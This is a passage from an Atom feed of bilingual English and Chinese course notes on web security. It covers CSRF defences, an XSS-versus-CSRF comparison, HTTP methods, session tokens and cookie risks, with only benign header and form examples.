&lt;li&gt;示例：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;sessionId=abc123; SameSite=Strict;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Verifying Origin With Standard Headers
&lt;ul&gt;
&lt;li&gt;Determine and match both the source and target of a request&lt;/li&gt;
&lt;li&gt;如何防护：Web 应用服务器检查请求的 Origin 或 Referer 头，并确保它们与应用的域匹配。&lt;br&gt;
仅允许来自可信域的请求进行处理。&lt;/li&gt;
&lt;li&gt;示例：对于银行转账请求，服务器将确保请求的来源为 &lt;code&gt;https://bank.com&lt;/code&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Double Submit Cookie
&lt;ul&gt;
&lt;li&gt;Every transaction request must include a random value in both a cookie and as a request parameter&lt;/li&gt;
&lt;li&gt;如何防护：&lt;br&gt;
用户在登录时生成一个随机值，并在后续的每个请求中将该值同时包含在 Cookie 和请求参数中。&lt;br&gt;
服务器检查这两个值是否匹配，不匹配则拒绝请求。&lt;/li&gt;
&lt;li&gt;优势：攻击者无法同时控制 Cookie 和请求参数，防止了 CSRF 攻击。&lt;/li&gt;
&lt;li&gt;示例：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// Set cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Set-Cookie: csrfToken=xyz123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; // Form submission includes the token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; POST /transfer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Cookie: csrfToken=xyz123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Body: token=xyz123&amp;amp;acct=CHARLIE&amp;amp;amount=1000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;User Interaction
&lt;ul&gt;
&lt;li&gt;Involve the user in the transaction (e.g. one-time verification code, CAPTCHA, etc.)&lt;/li&gt;
&lt;li&gt;如何防护：在重要操作（如转账、密码修改等）中使用一次性验证码（OTP）、CAPTCHA 或类似机制，要求用户主动确认操作。&lt;br&gt;
通过用户的主动参与，确保请求是由用户发起的，而不是由恶意脚本伪造的。&lt;/li&gt;
&lt;li&gt;优势：阻止自动化 CSRF 攻击，提高了用户操作的安全性。&lt;/li&gt;
&lt;li&gt;示例：在转账页面中要求用户输入发送到其手机的一次性验证码（OTP）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;XSS VS CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#XSS VS CSRF&#34;&gt;#&lt;/a&gt;XSS VS CSRF&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方面&lt;/th&gt;
&lt;th&gt;XSS (Cross-Site Scripting)&lt;/th&gt;
&lt;th&gt;CSRF (Cross-Site Request Forgery)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;攻击目标&lt;/td&gt;
&lt;td&gt;执行恶意代码，控制用户浏览器&lt;/td&gt;
&lt;td&gt;利用用户的身份认证，进行未授权请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;危害&lt;/td&gt;
&lt;td&gt;窃取敏感信息、劫持会话、操纵网页内容&lt;/td&gt;
&lt;td&gt;未授权更改数据、提交表单等敏感操作&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;原理&lt;/td&gt;
&lt;td&gt;注入恶意代码，使浏览器执行攻击者的脚本&lt;/td&gt;
&lt;td&gt;利用用户的已登录状态，发送伪造的请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;防御措施&lt;/td&gt;
&lt;td&gt;输入过滤、内容安全策略 (CSP)、HttpOnly Cookie&lt;/td&gt;
&lt;td&gt;CSRF 令牌、检查 Referer Header、SameSite Cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</content>
        <category term="software security" />
        <category term="HTTP" />
        <category term="XSS" />
        <category term="CSRF" />
        <updated>2024-10-30T12:31:43.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/course/Web-Application-Security/</id>
        <title>Web Application Security</title>
        <link rel="alternate" href="http://example.com/course/Web-Application-Security/"/>
        <content type="html">&lt;h1 id=&#34;Overall&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Overall&#34;&gt;#&lt;/a&gt;Overall&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Web Application Stack&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672216036891d.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;li&gt;OSI Network Protocol Stack&lt;br&gt;
More in Network System&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722160374233.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;li&gt;Web Applications&lt;br&gt;
Security problem is usually to do with dynamic creation of web contents&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672216b529859.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;HTTP&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#HTTP&#34;&gt;#&lt;/a&gt;HTTP&lt;/h1&gt;
&lt;h2 id=&#34;HTTP&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#HTTP&#34;&gt;#&lt;/a&gt;HTTP&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;HyperText Transport Protocol (HTTP)&lt;br&gt;
HTTP is a request/response protocol for communicating between web clients and web servers.&lt;br&gt;
A web client sends a request to a particular web server for a particular resource (identified by a URL) and the web server responds with some kind of data (often HTML data)&lt;/li&gt;
&lt;li&gt;HTTP Request Messag&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Send TCP/IP message to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==&#34;&gt;www.example.com&lt;/span&gt; on port 80 containing the following:&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672217d602618.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;HTTP Request Methods&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Method&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;Retrieve information&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;Request some operation be performed&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;td&gt;Provide new information&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DELETE&lt;/td&gt;
&lt;td&gt;Request something be removed from server&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HEAD&lt;/td&gt;
&lt;td&gt;Same as GET except that only header info is returned&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OPTIONS&lt;/td&gt;
&lt;td&gt;Request information about communication options available&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TRACE&lt;/td&gt;
&lt;td&gt;Used for testing and diagnosing problems&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CONNECT&lt;/td&gt;
&lt;td&gt;Used for tunnelling using proxies&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;HTTP Response Message&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672217d60533f.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;li&gt;HTTP is a Stateless Protocol&lt;br&gt;
HTTP is said to be a stateless protocol because each request is handled independently&lt;br&gt;
Assumes no memory of requests that came before current request&lt;br&gt;
If a web server receives a number of HTTP requests from the same client, they are each handled by the server in exactly the same way as they would, had they been sent from different clients.&lt;/li&gt;
&lt;li&gt;HTML Forms: the GET Method&lt;br&gt;
The GET method sends encoded data appended to the URL string&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;The data is separated from the URL by a ‘?’&lt;/li&gt;
&lt;li&gt;The encoded data and any path information are placed in the CGI environment variables  &lt;code&gt;QUERY_STRING&lt;/code&gt;  and  &lt;code&gt;PATH_INFO&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;HTML Forms: the Post Method&lt;br&gt;
The POST method sends encoded data in the body section of the request&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Data in the body is encoded in the same way as in the GET method&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Feature&lt;/th&gt;
&lt;th&gt;GET&lt;/th&gt;
&lt;th&gt;POST&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;用途&lt;/td&gt;
&lt;td&gt;通常用于信息检索，不会改变服务器状态&lt;/td&gt;
&lt;td&gt;提交数据进行处理，可能更新服务器或数据库状态&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可见性&lt;/td&gt;
&lt;td&gt;参数在 URL 中可见，易于调试&lt;/td&gt;
&lt;td&gt;参数隐藏在请求主体中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;安全性&lt;/td&gt;
&lt;td&gt;不适合提交密码等敏感信息&lt;/td&gt;
&lt;td&gt;不提供安全的隐私保护&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;长度限制&lt;/td&gt;
&lt;td&gt;受 URL 最大字符长度限制&lt;/td&gt;
&lt;td&gt;受服务器可接受的数据量限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;缓存性&lt;/td&gt;
&lt;td&gt;可以被缓存&lt;/td&gt;
&lt;td&gt;必须重新传输数据，且不会自动缓存&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;HTTP Sessions&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#HTTP Sessions&#34;&gt;#&lt;/a&gt;HTTP Sessions&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;HTTP Sessions&lt;br&gt;
A sequence of requests and responses from one browser to one (or more) sites&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Session can be long or short
&lt;ul&gt;
&lt;li&gt;Google advertising tracking: 1+ years&lt;/li&gt;
&lt;li&gt;Google Mail login: 2 weeks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Authorise user once, and all subsequent requests are tied to user
&lt;ul&gt;
&lt;li&gt;Without session management, users would have to constantly reauthenticate&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web application environments (ASP, PHP, etc.) provide session tokens&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Session Tokens&lt;br&gt;
Identifying the specific session instance&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/67221c58289ab.png&#34; alt=&#34;img&#34;&gt;
&lt;ol&gt;
&lt;li&gt;Session Tokens in URLs&lt;br&gt;
The session token is part of the URL and will be sent to the web server through HTTP GET requests&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;E.g. &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbS9idXkuYXNwP2FydGljbGU9Mjc3ODE7c2Vzc2lvbmlkPUlFNTU3OTkwMTU3OA==&#34;&gt;http://www.example.com/buy.asp?article=27781;sessionid=IE5579901578&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;This mechanism works even in case of client security restrictions (e.g., no cookies are allowed)&lt;br&gt;
Problems:&lt;/li&gt;
&lt;li&gt;All information contained in the URL might be stored in firewall or proxy log files
&lt;ul&gt;
&lt;li&gt;Could simply be printed out with the web page on a shared printer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The URL, including sensitive data, can be sent in the HTTP referrer field to other web servers&lt;/li&gt;
&lt;li&gt;Imply a high risk of sensitive session data being disclosed to unauthorised third parties&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;HTML Forms with Hidden Fields&lt;br&gt;
Session token and information can be included in hidden fields in a form&lt;br&gt;
Works even in case of user client security restrictions, e.g., no cookies or JavaScript&lt;br&gt;
Does not provide protection mechanisms such as session expiration&lt;br&gt;
Cannot last beyond a single interactive session&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;FORM&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;METHOD&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;ACTION&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/cgi-bin/order_goods.pl&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;INPUT&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;TYPE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;NAME&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;customerid&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;VALUE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0815&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;INPUT&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;TYPE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;NAME&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;valid_order&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;VALUE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;yes&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;INPUT&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;TYPE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;NAME&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;productid&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;VALUE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;4711&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;FORM&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code&gt;3. HTTP Cookies
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Can be set either using HTTP headers or JavaScript&lt;br&gt;
An extra response header is added as follows to save information to the client&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;id=321328765; domain=.qut.edu.au; path=/cgi-bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;When a user sends an HTTP request for a URL for which the client machine&lt;br&gt;
holds a cookie, an extra HTTP header is added to the client request every time&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie:id=321328765&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Other attributes: Expires, Domain, HttpOnly, Path, Port, Secure&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672221a731746.png&#34; alt=&#34;img&#34;&gt;&lt;br&gt;
3.  Session tokens Risk&lt;br&gt;
1. Predictable Tokens&lt;br&gt;
- Counter (Verizon Wireless)&lt;br&gt;
- Weak MAC (WSJ)&lt;br&gt;
- token = {userid,  MAC_k(userid) }&lt;br&gt;
- Apache Tomcat&lt;br&gt;
-  &lt;code&gt;generateSessionID()&lt;/code&gt;  uses MD5 but with a weak pseudorandom number generator &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9yZXNlYXJjaC93cC1jb250ZW50L3VwbG9hZHMvMjAxNi8wMi9nbTA1LnBkZg==&#34;&gt;CT-RSA 2005&lt;/span&gt;&lt;br&gt;
- PHP&lt;br&gt;
-  &lt;code&gt;create_session_id&lt;/code&gt;  uses weak pseudorandom number generator &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxMC9NYXIvNTE5&#34;&gt;seclists.org&lt;/span&gt;&lt;br&gt;
2. Cookie Theft&lt;br&gt;
 一些网站仅加密登录过程，而不加密会话 Cookie，从而导致会话令牌容易被截获&lt;br&gt;
 Example 1: login over HTTPS, but subsequently use HTTP&lt;br&gt;
- 在不安全的网络环境（如无线咖啡馆）中，Cookie 可能被窃取。&lt;br&gt;
- Other reasons why session token sent in the clear&lt;br&gt;
- HTTPS/HTTP mixed content pages at site&lt;br&gt;
- Man-in-the-middle attacks on SSL&lt;br&gt;
- &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb2RlYnV0bGVyLmNvbS8yMDEwLzEwLzI0L2ZpcmVzaGVlcC8=&#34;&gt;Firesheep&lt;/span&gt; Firefox extension performs this attack&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Example 2: Cross-Site Scripting (XSS) attacks
&lt;/code&gt;&lt;/pre&gt;
</content>
        <category term="software security" />
        <category term="HTTP" />
        <category term="OSI" />
        <updated>2024-10-30T11:17:47.000Z</updated>
    </entry>
</feed>
